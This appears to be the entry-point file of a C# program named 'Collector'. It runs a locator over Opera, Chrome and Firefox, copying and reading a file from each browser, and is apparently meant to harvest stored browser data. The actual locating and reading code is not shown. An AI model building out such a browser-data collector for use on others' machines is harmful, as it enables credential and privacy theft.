using System;
using System.Collections.Generic;
using System.Linq;
using System.Text;
using System.Threading.Tasks;


namespace Collector
{
    class Program
    {
        static void Main()
        {

            Locator l = new Locator();
            l.VariableDirectory();
            // For Opera
            try
            {
                l.OperaLocator();
                l.CopyFile();
                l.Reader();
            }
            catch(Exception ex)
            {
                new LogWriter(ex.Message);
            }

            // For Google Chrome
            try
            {
                l.ChromeLocator();
                l.CopyFile();
                l.Reader();
            }
            catch (Exception ex)
            {
                new LogWriter(ex.Message);
            }

            // For Mozilla Firefox
            try
            {
                l.MozillaLocator();
                l.CopyFile();
                l.Reader();
            }
            catch (Exception ex)
            {
                new LogWriter(ex.Message);
            }

            Console.ReadLine();
        }
    }

} 